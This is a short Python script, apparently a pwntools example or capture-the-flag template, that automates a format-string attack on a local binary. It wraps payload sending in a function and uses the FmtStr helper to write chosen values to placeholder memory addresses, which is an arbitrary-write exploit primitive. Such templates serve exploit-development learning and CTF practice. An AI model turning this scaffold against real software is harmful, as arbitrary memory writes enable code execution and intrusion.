from pwn import *
from pwnlib.fmtstr import FmtStr,fmtstr_payload,fmtstr_split

elf=context.binary=ELF('./binary')

io=process()

def send_payload(payload):
        log.info("payload = %s" % repr(payload))
        io.sendline(payload)
        return io.recv()

# Create a FmtStr object and give to him the function
format_string = FmtStr(execute_fmt=send_payload)
format_string.write(0x0, 0x1337babe) # write 0x1337babe at 0x0
format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
format_string.execute_writes()
